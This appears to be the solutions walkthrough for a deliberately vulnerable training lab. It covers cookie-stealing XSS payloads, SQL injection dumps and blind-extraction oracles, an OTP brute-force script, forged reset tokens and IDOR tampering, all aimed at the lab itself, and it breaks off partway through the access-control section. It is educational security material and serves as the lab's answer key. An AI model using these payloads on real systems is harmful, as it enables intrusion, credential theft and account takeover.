# PenTrix VulnLab – Solutions

Full walkthroughs for all 201 challenges. **Try each one yourself first** – the hints on each module page are there to nudge you, not to hand you the answer.

> **Flags are random per deployment.** Every challenge flag is generated fresh on your machine when the app first boots, and no flag ever appears in a tracked file. The walkthroughs below show `PENTRIX{...}` as a placeholder wherever a flag appears: they teach you *how* to earn it, and your lab will award the real one when your exploit succeeds.

Base URL for every payload below: `http://<your-lab-address>` (the host and port your lab instance runs on; substitute it wherever a command below targets the lab itself).

## Burp Suite setup (do this once)

Every walkthrough below is written Burp-first. You need **Burp Suite Community** (free) and about two minutes of setup:

1. **Launch Burp**, create a temporary project, leave it on the Proxy tab.
2. **Point your browser at Burp.** The easiest path is Burp's own built-in browser (it is already proxied). Otherwise set your browser's manual proxy to `127.0.0.1:8080`, which is Burp's default listener.
3. **HTTPS is not a problem here.** The lab runs on plain HTTP at your lab address, so you can skip installing Burp's CA certificate. On real engagements you would install it via `http://burpsuite` in the Burp browser.
4. **Intercept:** Proxy tab, toggle "Intercept is on". Now browse the lab. Each request pauses so you can read it, change it, forward it, or drop it.
5. **Repeater:** right-click any captured request and choose **Send to Repeater** (Ctrl+R). This is your workbench: edit the request, hit Send, read the response, repeat until it breaks.
6. **Intruder:** right-click and choose **Send to Intruder** (Ctrl+I). This is for the brute-force and race-condition challenges: mark positions, load payloads, fire many requests fast.

Each challenge below ends with a **Burp workflow** line: what to intercept, what to send to Repeater, and what to change. Follow the walkthrough for the *why*, follow the Burp workflow for the *how*.

---

## xss – Cross-Site Scripting

**Beacon model (all 9 challenges):** every challenge page computes a one-time
page token into the live `window.__px` variable when its script runs (the raw
token is not printed in the page source, so you cannot scrape it with curl).
The collector at `/xss/collect` awards only a beacon carrying non-empty data
(`c`), a known vuln id (`v`), and the current token (`n`); a used token
never works twice, so a bare curl with no page load earns nothing. All payloads
below read the token from the running page with `n='+window.__px`.

**1. Reflected XSS** – `PENTRIX{...}`
The search box reflects your query into the page with no escaping:
```
GET /xss/search?q=<script>alert(1)</script>
```
Then prove it reached a victim by "sending" the cookie to the collector, carrying
the page token the challenge page holds in `window.__px` when its script runs
(the collector only awards a beacon with a valid, unused `n`):
```
GET /xss/collect?c=abc&v=reflected&n=<page token from window.__px>
```
Why it works: untrusted input is concatenated straight into HTML. In the real world the attacker would mail this link to a victim.

**Burp workflow:** Type a test string into the search box on `/xss/search` and intercept the request in Proxy, noting the `q` parameter goes straight into the page HTML unescaped. Send that GET to Repeater (Ctrl+R), change `q` to a `<script>` that beacons to `/xss/collect` with `n='+window.__px`, and send it: the response body mirrors your beacon back raw. Open the crafted URL in your proxied browser and watch the beacon land in Proxy history; the payload reads the live `window.__px` from the page, which is what makes the collector award the flag.


**2. Stored XSS** – `PENTRIX{...}`
Post a comment containing a script; it is stored and rendered raw for every later visitor:
```
POST /xss/guestbook
author=you&body=<script>fetch('/xss/collect?c='+document.cookie+'&v=stored&n='+window.__px)</script>
```
Then, with the victim viewing the guestbook, the stored script fires:
```
GET /xss/collect?c=abc&v=stored&n=<page token from window.__px>
```
Why it works: the guestbook saves HTML verbatim and serves it back unsanitized. Stored XSS is worse than reflected because the victim only has to view the page.

**Burp workflow:** Submit a comment on `/xss/guestbook` and intercept the POST in Proxy, checking the `author` and `body` form fields go through without any sanitization. Send that POST to Repeater (Ctrl+R), change `body` to carry a script that beacons to `/xss/collect` with `n='+window.__px`, and send it: the comment is stored verbatim. Then GET `/xss/guestbook` in Repeater and search the response body for your script: seeing it served back raw confirms every future visitor will execute it.


**3. DOM XSS** – `PENTRIX{...}`
The `/xss/dom` demo page drops attacker-controlled data into the DOM with a dangerous sink (`innerHTML`). Craft a URL whose fragment fires the beacon on page load:
```
/xss/dom#<img src=x onerror="fetch('/xss/collect?c='+document.cookie+'&v=dom&n='+window.__px)">
```
Why it works: the injection happens entirely in the browser – the server never sees the payload (it lives after `#`), so server-side filters cannot help. A plain `<script>` tag dropped in through `innerHTML` never runs, hence the event-handler payload.

**Burp workflow:** Open `/xss/dom` and feed a test string into the URL fragment, intercepting in Proxy to confirm nothing in the fragment reaches the server. Open the page source in the browser and look for the sink: the inline script pushes `location.hash` into `innerHTML`. Build the fragment above, open the full URL in your proxied browser, and watch the beacon land in Proxy history carrying `c`, `v=dom`, and `n=window.__px`: the collector only awards when the token matches the one the page rendered.


---


**4. XSS via Attribute Breakout** – `PENTRIX{...}`
1. Open `/xss/attr?n="><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout&n='+window.__px)</script>`
2. The page renders `<input type="text" value=""><script>...</script>" readonly />` and the script executes, firing the beacon.
Why it works: the nickname is interpolated raw inside `value="..."`, so `">` closes the attribute and the injected `<script>` tag runs.

**Burp workflow:** Request `/xss/attr` with a test nickname and intercept in Proxy, then look at the response: your nickname sits raw inside `value="..."` of an input tag. Send that GET to Repeater (Ctrl+R) and change `n` to `"><script>alert(1)</script>`: send it and check the response now shows `<input type="text" value=""><script>...` in the body, which is the breakout working. Once confirmed, swap the probe for a beacon to `/xss/collect` with `n='+window.__px` so a real render fires the flag.


**5. XSS in a JavaScript String** – `PENTRIX{...}`
1. Open `/xss/jsctx?q=';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context&n='+window.__px);//` (URL-encoded).
2. The page renders `var q = '';fetch('...');//';` and the fetch executes, firing the beacon.
Why it works: input is reflected raw inside a single-quoted JS string; the leading `'` ends the string, the attacker's statement runs, and `//` comments out the trailing quote.

**Burp workflow:** Request `/xss/jsctx?q=test` and intercept in Proxy, then inspect the response body: your input lands raw inside a single-quoted JS variable like `var q = 'test';`. Send that GET to Repeater (Ctrl+R), change `q` to `';alert(1);//`, and send it: the response now shows `var q = '';alert(1);//';`, which is the string escape working. Replace the probe with a beacon call to `/xss/collect` with `n='+window.__px` so rendering the page in your proxied browser triggers the flag.


**6. Stored XSS via SVG Upload** – `PENTRIX{...}`
1. Open `/xss/svg` and upload this SVG (the SVG opens as its own document where `window.__px` is
   not defined, so the script cannot read the page token directly. The file link carries the token
   as two share values, `?pxa=` and `?pxk=`, and the script rebuilds the token at runtime by XORing
   the hex pairs; the raw token never appears anywhere. The file is parsed as XML, so the script
   sits in a CDATA section):
   `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+(function(){var p=new URLSearchParams(location.search);var a=p.get('pxa')||'',k=p.get('pxk')||'',t='';for(var i=0;i+1<a.length&&i+1<k.length;i+=2){t+=String.fromCharCode(parseInt(a.substr(i,2),16)^parseInt(k.substr(i,2),16));}return t;})())]]></script></svg>`
2. Open the uploaded file's link (it carries the two shares, e.g. `/xss/uploads/<name>-<timestamp>.svg?pxa=<hex>&pxk=<hex>`). The script rebuilds the token from the shares, fires the beacon, and the beacon awards the flag. Reading a token straight out of the URL with `?n=` does not work: there is no `n` parameter on the file link, only the two shares.
Why it works: the file is served back as `image/svg+xml`, and SVG is XML that may contain `<script>`; a direct visit executes it in the lab's origin.

**Burp workflow:** Upload an SVG on `/xss/svg` and intercept the POST in Proxy, noting the multipart body carries your file and the server returns the stored path under `/xss/uploads/`. Send the upload to Repeater (Ctrl+R) and resend with an SVG containing a script beacon: copy the returned upload path from the response. Then GET that `/xss/uploads/...` path in Repeater and check the `Content-Type: image/svg+xml` header: the SVG serves as live script, so opening it in your browser executes the beacon and awards the flag.


**7. XSS via Naive Markdown Links** – `PENTRIX{...}`
1. Open `/xss/markdown` and render:
   `[click](javascript:fetch('/xss/collect?c='+document.cookie+'&v=xss-markdown&n='+window.__px))`
   (the renderer's link pattern allows one level of balanced parentheses in the URL, so the `fetch(...)` call survives whole inside the link target).
2. The output contains `<a href="javascript:...">click</a>`. Click it: the script runs and the beacon awards the flag.
Why it works: the naive renderer converts `[text](url)` to an anchor without validating the URL scheme, so `javascript:` URLs survive into a live link.

**Burp workflow:** Submit a markdown link on `/xss/markdown` and intercept the POST in Proxy, then read the response HTML: the naive renderer turns `[text](url)` into a bare `<a>` tag with no scheme validation. Send that POST to Repeater (Ctrl+R) and change the link URL to a `javascript:` scheme carrying a beacon to `/xss/collect` with `n='+window.__px` (the renderer allows one level of balanced parentheses, so the call survives whole). Send it and confirm the response body contains `<a href="javascript:...">`: clicking that rendered link in your proxied browser fires the beacon.


**8. DOM Clobbering to Admin** – `PENTRIX{...}`
1. Open `/xss/clobber` and save this custom HTML:
   `<form id="settings"><input name="isAdmin" value="1">`
   (The sanitizer strips `<script>` blocks but allows `form`/`input`.)
2. Reload `/xss/clobber`: the page script sees `window.settings.isAdmin` (the form is exposed as `window.settings`, its named input as `.isAdmin`) and reveals the admin panel.
3. Open `/xss/clobber-admin` to claim the flag.
Why it works: named DOM elements shadow `window` properties, so attacker markup creates the `window.settings` object the page script trusts, flipping the `isAdmin` check without any script tag.

**Burp workflow:** Save custom HTML on `/xss/clobber` and intercept the POST in Proxy, noting the sanitizer strips `<script>` but lets `form` and `input` tags through. Send the save to Repeater (Ctrl+R) and set the HTML to `<form id="settings"><input name="isAdmin" value="1">`: send it, then GET `/xss/clobber` and confirm your markup is served back intact. Reload the page in your proxied browser: the named form shadows `window.settings`, the page's `isAdmin` check flips, and the admin panel appears so you can request `/xss/clobber-admin` for the flag.


**9. XSS in a Template Literal** – `PENTRIX{...}`
1. Open `/xss/backtick?m=${fetch('/xss/collect?c='+document.cookie+'&v=xss-backtick&n='+window.__px)}` (URL-encoded).
2. The page renders `` var msg = `${fetch('...')}`; `` and the expression evaluates, firing the beacon.
Why it works: input is reflected raw inside a backtick template literal, and `${...}` expressions inside template literals are evaluated as JavaScript.

**Burp workflow:** Request `/xss/backtick?m=test` and intercept in Proxy, then read the response: your input lands raw inside a backtick template literal as `` var msg = `test`; ``. Send that GET to Repeater (Ctrl+R) and change `m` to `${alert(1)}`: send it and confirm the response shows `` var msg = `${alert(1)}`; ``, which is the expression being evaluated. Replace the probe with a beacon to `/xss/collect` with `n='+window.__px` and render the page in your proxied browser so the template expression fires the flag.

---


## sqli – SQL Injection

Five of these challenges (Boolean Blind, ORDER BY, LIKE Wildcard, LIMIT/OFFSET, and GROUP BY) each guard their **own** challenge secret. Your injected SQL can read that secret as `sqli_target()`, and only inside that challenge's own route: everywhere else the function returns NULL. A secret pulled out of another challenge (including the admin secret from a UNION dump) will not match these five, so each technique has to be worked for real. The other six challenges still target the admin secret or the admin account directly, as described in their entries.

**1. Login bypass** – `PENTRIX{...}`
The login query interpolates your username into SQL. Break out of the string, make the WHERE clause always true, and comment out the password check:
```
POST /sqli/login
username=' OR '1'='1' -- &password=<redacted>
```
Why it works: the query becomes `... WHERE username='' OR '1'='1' -- ' AND password='...'`, which matches the admin row without a password. Logging in with the real admin password also signs you in, but earns no flag: only a login that came from breaking the query counts.

**Burp workflow:** In the Proxy, click the Login button on GET /sqli/login and intercept the form POST to /sqli/login. Send it to Repeater (Ctrl+R) and replay it with the username and password fields visible so you can edit them freely. Add a quote and an always-true condition to the username field, end it with a SQL comment (`-- `) so the password check is commented out, and see what changes in the response.


**2. UNION-based Injection** – `PENTRIX{...}`
The product search concatenates `q` into the query. Append a UNION SELECT with matching column count:
```
GET /sqli/products?q=' UNION SELECT id,username,password,secret FROM users--%20
```
Why it works: UNION merges rows from another table into the result set, so the page renders usernames, password hashes, and secrets as "products". The flag is awarded when the admin secret appears in the rendered results.

**Burp workflow:** Load GET /sqli/products in the browser, type something in the q search box, and catch the request in the Proxy. Send it to Repeater and play with the q parameter: first add a quote to confirm it breaks the query, then grow your UNION SELECT step by step. Start with a UNION SELECT that has just one column, add columns one at a time until the page renders again, then point it at the users table.


**3. Boolean Blind Injection** – `PENTRIX{...}`
`/sqli/product?id=` only answers "Product exists / Not found", but you can ask it yes/no questions about this challenge's own secret, which your injected SQL reads as `sqli_target()`:
```
GET /sqli/product?id=0' OR substr(sqli_target(),1,1)='P' -- 
```
"Product exists" means the guess is right, "Not found" means it is wrong. Repeat per character position (the secret has the `PENTRIX{...}` shape, so you know which characters to expect at the braces) until you have the whole value, then submit what you extracted:
```
POST /sqli/blind-submit
secret=<redacted>
```
Why it works: even a single bit of difference in the response is enough to exfiltrate data one boolean question at a time. The submit box is bound to this challenge alone: the admin secret (for example one dumped via the UNION challenge) is rejected here.

**Burp workflow:** Intercept GET /sqli/product?id=1 in the Proxy and send it to Repeater so you can watch how the page behaves for a real product versus a missing one. Tweak the id parameter with AND/OR conditions against `sqli_target()` and notice the response flips between the two states, which gives you a true/false oracle. For the full extraction you will need one request per character, so mark the guessed-character position and send it to Intruder (Ctrl+I) as a sniper with a character payload set, reading the results with Grep-Match on the "Product exists" text. Submit the recovered secret in the form on the product page.


**4. Error-based Injection** – `PENTRIX{...}`
Raw SQLite errors are printed to the page. Any malformed input proves the injection point:
```
GET /sqli/detail?id='
```
Why it works: verbose database errors confirm your input reached the SQL parser and leak schema details for free. Two error families both earn the flag: a parse-time error (a stray quote gives "unrecognized token" or "syntax error") and a runtime error (malformed JSON, a wrong-argument function call, or a missing column). Either one proves error-based injection.

**Burp workflow:** Open GET /sqli/detail in the browser, submit the id field, and catch it in the Proxy. Send it to Repeater and drop a single quote into id, then read the response: raw SQLite errors show up right on the page. Use those error messages to learn the table structure before you build anything fancier, and try a runtime break (malformed JSON or a wrong number of arguments) as the second error path.


---


**5. ORDER BY Injection** – `PENTRIX{...}`

The `sort` parameter on `/sqli/sort` is interpolated straight into `ORDER BY`,
and `ORDER BY` accepts full expressions, not just column names. Smuggle in a
`CASE WHEN` boolean oracle that reads this challenge's own secret as
`sqli_target()`:

```
GET /sqli/sort?sort=(CASE WHEN substr(sqli_target(),1,1)='P' THEN id ELSE name END)
```

Watch the row order: when the condition is true the table is sorted by id;
flip `'P'` to a wrong guess like `'X'` and the table is sorted by name
instead. Each request answers one yes/no question about the secret. Extract
it one character at a time, then submit the full value in the form below the
table:

```
POST /sqli/sort/submit
secret=<redacted>
```

Why it works: `ORDER BY` evaluates any expression per row, so a conditional
expression turns the visible sort order into a boolean oracle. Running the
oracle alone earns nothing: the flag is awarded only when the extracted
secret is submitted, and the submit box accepts only this challenge's own
secret, so a secret read from the users table (or from another challenge)
is rejected.

**Burp workflow:** Open GET /sqli/sort and intercept a request with the sort parameter, then send it to Repeater. Notice that sort is not a value but an ORDER BY expression, so try swapping the sort column for a CASE WHEN expression against `sqli_target()` and watch the product order flip. Once the order changes predictably, hand the character guesses to Intruder (Ctrl+I) and read each position from the row order, then submit the recovered secret in the form below the table.


**6. Second-Order SQL Injection** – `PENTRIX{...}`

Registration stores your display name with a prepared
statement, so the payload sleeps quietly. But `/sqli/profile` later interpolates
that stored value into a brand-new query:

```
POST /sqli/register
username=evil1&display_name=admin'--&password=<redacted>

GET /sqli/profile?u=evil1
```

The profile page runs `SELECT * FROM users WHERE username='admin'--'` and lands
on the admin account, displaying its secret and awarding the flag. The injection
fires on read, not on write. Registering the plain display name `admin` with no
quote breakout earns nothing: the stored value must actually break out of the
string literal in the second query.

Why it works: input that is safe at rest becomes SQL when it is concatenated
into a later query; the trust boundary moved from the form to the database.

**Burp workflow:** In the Proxy, catch the POST to /sqli/register with the username, display_name, and password fields, then send it to Repeater. Plant something SQL-ish in display_name (quotes, comment markers) and note that registration succeeds quietly; nothing fires yet. Now request GET /sqli/profile?u=<your username> in Repeater and watch the stored value turn into SQL at read time, which is when the injection actually triggers.


**7. LIKE Wildcard Exfiltration** – `PENTRIX{...}`

`/sqli/wildcard` drops your term into `LIKE '%q%'` inside a string-interpolated
query, and the page now reports only **how many** products match. A bare `%`
just widens the catalog search and earns nothing on its own. The real attack
is a quote breakout that turns the match count into a boolean oracle against
this challenge's own secret, readable as `sqli_target()`:

```
GET /sqli/wildcard?q=' AND substr(sqli_target(),1,1)='P' -- 
```

When the guess is right, every product matches and the page reports the full
catalog count; when it is wrong, the count drops to 0. Work through the secret
one character at a time, then submit it:

```
POST /sqli/wildcard/submit
secret=<redacted>
```

Why it works: `%` and `_` are wildcards inside `LIKE` and are never escaped,
and because the whole query is string-interpolated, a quote breakout lets you
attach a subquery condition to the pattern, turning a match count into a
true/false oracle. The submit box accepts only this challenge's own secret.

**Burp workflow:** Intercept GET /sqli/wildcard?q=something in the Proxy and send it to Repeater. Try replacing the term with just % first and note the page only reports a match count, with no rows and no flag. Then build the oracle: break out of the quote and add an AND condition against `sqli_target()` so the count flips between the full catalog and zero as your character guess changes. Send the oracle to Intruder (Ctrl+I) with a character payload set to extract the secret position by position, then submit it in the form on the checker page.


**8. LIMIT/OFFSET Injection** – `PENTRIX{...}`

`/sqli/paged` shows 2 products, but `limit` is interpolated raw into the `LIMIT`
clause, and `LIMIT` accepts more than a plain number:

```
GET /sqli/paged?limit=-1
GET /sqli/paged?limit=1,10
```

One catalog row (Archived Prototype X9) never appears on the default page of
2, and its description carries this challenge's audit token. Both requests
above pull that hidden row into view, and the flag is awarded when the token
appears in the output through genuine LIMIT-clause manipulation. A plain
number like `limit=10` shows the hidden row too, but earns nothing, and a
no-op suffix that still shows the same 2 products earns nothing either: the
technique must be LIMIT syntax, not just a bigger page size.

Why it works: the numeric context was never validated, so SQL clause syntax
(`-1`, `offset,count`) is accepted where only a page size was intended, and a
row the pagination was meant to hide becomes reachable.

**Burp workflow:** Open GET /sqli/paged and catch the request with its limit parameter in the Proxy, then send it to Repeater. The page only shows 2 products, so try values beyond plain positive numbers in limit (below zero, or two numbers separated by a comma) and watch the returned rows shift until the hidden catalog row and its audit token appear. Keep testing which LIMIT syntax the backend accepts until the flag lands; a plain bigger number shows the row but does not count.


**9. GROUP BY Injection** – `PENTRIX{...}`

`/sqli/stats` groups sales by the `by` parameter and prints the grouping key in
the first column. `GROUP BY` accepts any expression, including a subquery.
Point the expression at this challenge's own secret:

```
GET /sqli/stats?by=(SELECT sqli_target())
```

Every row collapses into one group whose key is the challenge secret, which
renders in the Group column and triggers the flag in a single request.

Why it works: the grouping expression is attacker-controlled and echoed back,
so an expression that returns a single value exfiltrates it through the group
key. The expression must actually call `sqli_target()`: grouping by a
subquery against the users table, or pasting a secret you found elsewhere in
as a quoted literal, renders a group key but earns nothing.

**Burp workflow:** Intercept GET /sqli/stats?by=<something> in the Proxy and send it to Repeater. The by parameter feeds the GROUP BY expression directly, and the grouping key is printed back in the first column. Replace by with an expression that returns this challenge's secret (a subquery calling `sqli_target()`) and watch it show up as the group key; one request is enough, no guessing loop needed.


**10. UNION Filter Bypass** – `PENTRIX{...}`

`/sqli/shop` strips only the exact lowercase word `union` from your search. The
filter is case-sensitive and comment-blind:

```
GET /sqli/shop?q=' UNION SELECT id,username,password,secret FROM users-- 
```

Uppercase `UNION` sails through and dumps the users table, including the admin
secret, and the flag is awarded when the secret renders in the results. Variants that also work: mixed case (`uNiOn`) and inline comments
(`'/**/UNION/**/SELECT`). Lowercase `union` gets mangled into a database error,
which is the filter "working".

Why it works: blacklist filters that do not understand SQL case-insensitivity
or comment syntax are trivially bypassed with equivalent spellings.

**Burp workflow:** Catch GET /sqli/shop?q=<something> in the Proxy and send it to Repeater. Try the lowercase word union first and watch the request fail, which tells you a filter is stripping it. Now try uppercase and mixed-case spellings of the same keyword in the q field and see which ones the filter misses; build your UNION SELECT back up from there.


**11. INSERT Injection** – `PENTRIX{...}`

The feedback form at `/sqli/feedback` interpolates your input into
`INSERT INTO sqli_feedback(name, message) VALUES ('...', '...')`. Stacked
queries are blocked, but `VALUES()` accepts a subquery as a value:

```
POST /sqli/feedback
name=x', (SELECT secret FROM users WHERE username='admin')) -- &message=hello

GET /sqli/feedback
```

The resulting SQL is
`VALUES ('x', (SELECT secret FROM users WHERE username='admin')) -- ', 'hello')`,
so your feedback row's message becomes the admin secret. Viewing the feedback
wall awards the flag.

Why it works: breaking out of the VALUES list lets a scalar subquery supply a
column value, turning an INSERT into a read primitive.

**Burp workflow:** On GET /sqli/feedback, submit the form and intercept the POST to /sqli/feedback in the Proxy, then send it to Repeater. The name and message fields land in an INSERT VALUES list, so play with quotes in name until you can break out of the value list and slip a scalar subquery in as the value. Reload GET /sqli/feedback in Repeater afterward and check whether your submitted row now shows something it should not.


## auth – Broken Authentication

**1. No rate limiting** – `PENTRIX{...}`
Log in wrongly 5 or more times in the same session, then log in correctly as alice (`alice123`). Nothing stops you from guessing forever.
Why it works: no throttling, no lockout, no CAPTCHA. Weak passwords fall to simple scripting.

**Burp workflow:** Browse to the login page and try logging in as alice a few times with wrong passwords while Proxy logs each attempt, noting nothing ever locks you out. Send the login POST to Repeater (Ctrl+R) and replay it manually ten times to confirm the server never throttles. Then change the password field to `alice123` in Repeater and send again: the unrestricted guessing session leads straight into the account.


**2. Predictable Password Reset Tokens** – `PENTRIX{...}`
Reset tokens are just base64 of the username with no randomness and no server-side record. Forge one for admin:
```
POST /auth/reset/confirm
token=YWRtaW4=&newPassword=hacked123
```
(`YWRtaW4=` is base64 of `admin`.) The flag fires because that token was never legitimately issued in your session.
Why it works: predictable, unguessable-looking tokens are still predictable. Reset tokens must be random and single-use.

**Burp workflow:** Intercept the `POST /auth/reset/confirm` request in Proxy while testing a reset with a random token, and send it to Repeater (Ctrl+R). In Repeater, replace the `token` field with base64 of `admin` (`YWRtaW4=`) and set `newPassword` to something you choose. Send it: because the token is just base64(username) with no randomness or server-side record, the forged admin token is accepted.


---


**3. Username Enumeration** – `PENTRIX{...}`

1. Open `GET /auth/enum-login`.
2. Submit a bogus name:
   `curl --data-urlencode "username=nosuchuser" --data-urlencode "password=x" http://<your-lab-address>/auth/enum-login`
   Response: "User nosuchuser not found."
3. Submit a real name with a wrong password (keep the same cookie jar so the
   session persists):
   `curl -c jar -b jar --data-urlencode "username=alice" --data-urlencode "password=wrongpw" http://<your-lab-address>/auth/enum-login`
   Response: "Wrong password for user alice." The different message confirms
   the username exists.
4. Submit the confirmed name:
   `curl -c jar -b jar --data-urlencode "username=alice" http://<your-lab-address>/auth/enum-submit`
   The flag is awarded.

Why it works: the login distinguishes "user not found" from "wrong password",
so each probe leaks whether a username exists; the submit page awards the flag
once a name confirmed through that oracle is submitted.

**Burp workflow:** Open `GET /auth/enum-login` with intercept on and submit a bogus username in Proxy, then check the response for the "not found" wording. Send that login POST to Repeater (Ctrl+R), change only the `username` field to `alice` (wrong password), and compare the "wrong password" response: the two different messages confirm which names exist. Submit the confirmed name to `/auth/enum-submit` in Repeater to collect the flag.


**4. Brute-Forcing a 4-Digit OTP** – `PENTRIX{...}`

1. `curl -c jar -b jar http://<your-lab-address>/auth/otp-reset` and copy the
   reset token from the page (the scenario hands you a valid token for admin).
2. Brute-force all 10,000 codes against the verify endpoint (no rate limiting).
   Example script:
   ```python
   import re, requests
   s = requests.Session()
   token = re.search(r'<pre class="token">([0-9a-f]+)</pre>',
                     s.get('http://<your-lab-address>/auth/otp-reset').text).group(1)
   for i in range(10000):
       r = s.post('http://<your-lab-address>/auth/otp-reset/verify',
                  data={'token': token, 'otp': '%04d' % i, 'newPassword': 'otpwned1'})
       if 'PENTRIX{...}' in r.text:
           print('found:', '%04d' % i); break
   ```
3. The correct code resets admin's password and awards the flag; log in at
   `/auth/login` with the new password to confirm.

Why it works: a 4-digit code with no rate limiting, no lockout, and no expiry
is enumerable in seconds, and the token alone was never meant to be secret.

**Burp workflow:** Open `GET /auth/otp-reset` and copy the reset token from the page, then intercept the `POST /auth/otp-reset/verify` request in Proxy and send it to Intruder (Ctrl+I). Mark the `otp` field as the payload position, load a payload list of `0000` through `9999`, and start the attack: with no rate limiting or lockout the full space runs fast. Watch the results for the one response that resets admin's password, then log in at `/auth/login` with the new password to confirm.


**5. SHA-256 Predictable Reset Token** – `PENTRIX{...}`

1. Read the recipe shown on `GET /auth/sha-reset`:
   `sha256(username + 'reset-salt')`.
2. Forge admin's token locally, never requesting an admin reset:
   `node -e "console.log(require('crypto').createHash('sha256').update('admin'+'reset-salt').digest('hex'))"`
3. Confirm the forged token with a new password:
   `curl --data-urlencode "token=<forged>" --data-urlencode "newPassword=forged1" http://<your-lab-address>/auth/sha-reset/confirm`
   Admin's password changes and the flag is awarded.

Why it works: the token is a deterministic hash of public data, so anyone who
knows the recipe can mint a valid token for any account.

**Burp workflow:** Open `GET /auth/sha-reset` and read the recipe from the page (`sha256(username + 'reset-salt')`). Mint admin's token yourself locally (never request an admin reset), then send a `POST /auth/sha-reset/confirm` request to Repeater (Ctrl+R). Fill in the forged `token` and your chosen `newPassword`, and send: the deterministic hash of public data is accepted as a valid reset token.


**6. Guessable Security Question** – `PENTRIX{...}`

1. Open `GET /auth/bio/alice`. The bio says her mother's maiden name is Smith.
2. Reset her password with that answer:
   `curl --data-urlencode "username=alice" --data-urlencode "answer=Smith" --data-urlencode "newPassword=qwned1" http://<your-lab-address>/auth/question-reset`
   The flag is awarded; the new password works at `/auth/login`.

Why it works: the "secret" answer is public knowledge printed in the user's
bio, so the security question is not authentication at all.

**Burp workflow:** Open `GET /auth/bio/alice` in your browser and read the bio: it prints her mother's maiden name. Intercept the `POST /auth/question-reset` request in Proxy and send it to Repeater (Ctrl+R). Fill the `username` field with `alice`, the `answer` field with the name from the bio, and a `newPassword` of your choice. Send: public bio text passes as a "secret" answer.


**7. Password Change Without Current Password** – `PENTRIX{...}`

1. Log in as anyone: `curl -c jar -b jar --data-urlencode "username=bob" --data-urlencode "password=bob123" http://<your-lab-address>/auth/login`
2. Open `GET /auth/change-password` and note the form has no current-password field.
3. `curl -c jar -b jar --data-urlencode "newPassword=changed1" http://<your-lab-address>/auth/change-password`
   The password changes and the flag is awarded; log in with the new password
   to confirm.

Why it works: the endpoint trusts the session alone and never re-verifies
identity with the current password, so any active session can take over.

**Burp workflow:** Log in as bob through the browser with Proxy logging, then open `GET /auth/change-password` and notice the form has no current-password field. Intercept the `POST /auth/change-password` request in Proxy and send it to Repeater (Ctrl+R). Set `newPassword` to a value you choose and send: the endpoint trusts the session cookie alone, so the password changes with no re-verification.


**8. Support Ticket Impersonation** – `PENTRIX{...}`

1. Open `GET /auth/support`. Tickets are sequential.
2. Walk the range: `curl "http://<your-lab-address>/auth/support/login?ticket=1001"`
   through `1005`. Ticket 1004 logs you in as bob; ticket 1005 logs you in as
   admin and awards the flag.

Why it works: ticket ids are predictable and the support endpoint performs no
authorization check, so anyone can impersonate any customer, including admin.

**Burp workflow:** Open `GET /auth/support` and note that ticket ids are sequential, then intercept `GET /auth/support/login?ticket=1001` in Proxy and send it to Repeater (Ctrl+R). In Repeater, walk the `ticket` parameter up one by one (1002, 1003, 1004, 1005) and resend each time, watching who each ticket logs you in as. No authorization is checked, so the walk ends on the admin ticket.


## idor – Broken Access Control

Log in as alice first: `GET /idor/login/alice` (a one-click demo login, no password).

**1. Profile IDOR** – `PENTRIX{...}`
```
GET /idor/users/1
```
You are user 2, but nothing stops you reading user 1 (admin).

**Burp workflow:** In Burp's Proxy, turn Intercept on and open your own profile at `/idor/users/2`. Send that intercepted GET request to Repeater (Ctrl+R). In Repeater, change the id in the request line from `2` to `1` and hit Send. The response now shows admin's profile, because the endpoint checks that you are logged in but never checks that the id is yours.


**2. Unprotected admin panel** – `PENTRIX{...}`
```
GET /idor/admin
```
The panel only checks for *a* session, never for the *admin role*. Any logged-in user sees every user and order.
Why all three work: the app confuses authentication (who you are) with authorization (what you may do).

**Burp workflow:** With your normal alice session in the Proxy, send any intercepted request to Repeater (Ctrl+R) and rewrite the request line to `GET /idor/admin`. Send it and you land in the admin panel showing all users and orders, no admin role needed. The teaching point is to try Repeater against "admin only" paths with your own non-admin cookie still attached, the endpoint never inspects your role.


---


**3. Invoice Download IDOR** – `PENTRIX{...}`

1. Log in as alice.
2. `curl -c jar -b jar http://<your-lab-address>/idor/invoice/2` (bob's invoice)
   or `/idor/invoice/3` (admin's). The other user's invoice renders and the
   flag is awarded. Your own (`/idor/invoice/1`) gives no flag.

Why it works: the invoice is fetched by id with no ownership check.

**Burp workflow:** Intercept your own invoice request `GET /idor/invoice/1` in the Proxy and send it to Repeater (Ctrl+R). Change the id to `2` or `3` and Send to render someone else's invoice. To go further, send the same request to Intruder (Ctrl+I), set the id as the single payload position, and run a Sniper attack with numeric payloads 1 through 10 to enumerate every invoice on the server.


**4. Email Change IDOR** – `PENTRIX{...}`

1. Log in as alice and open `GET /idor/account` to see the change-email form.
2. Tamper the `user_id` field to target admin (id 1):
   `curl -c jar -b jar --data-urlencode "user_id=1" --data-urlencode "email=pwned@evil.lab" http://<your-lab-address>/idor/account/email`
   Admin's email is overwritten and the flag is awarded.

Why it works: the target account comes from a client-supplied `user_id`
parameter that the server never validates against the logged-in user.

**Burp workflow:** Open `GET /idor/account` in the browser and submit the change-email form while the Proxy is intercepting the POST to `/idor/account/email`. Send the intercepted request to Repeater (Ctrl+R); you will see form fields `user_id` and `email` in the URL-encoded body. Change `user_id` to `1` (admin) and Send, and the response confirms admin's email is overwritten, because the server trusts the client-supplied `user_id` without checking it against your session.


**5. API Key Regeneration IDOR** – `PENTRIX{...}`

1. Log in as alice and open `GET /idor/apikey`.
2. Regenerate admin's key (id 1) instead of your own:
   `curl -c jar -b jar --data-urlencode "user_id=1" http://<your-lab-address>/idor/apikey/regen`
   The page shows the fresh key, e.g. `idor_d698ad906655d4006c633bae`.
3. Authenticate with it:
   `curl -c jar -b jar "http://<your-lab-address>/idor/apikey/use?key=idor_d698ad906655d4006c633bae"`
   The page confirms the key belongs to admin and the flag is awarded.

Why it works: key regeneration trusts a client-supplied `user_id` with no
ownership check, so you can rotate anyone's key and then use the new value.

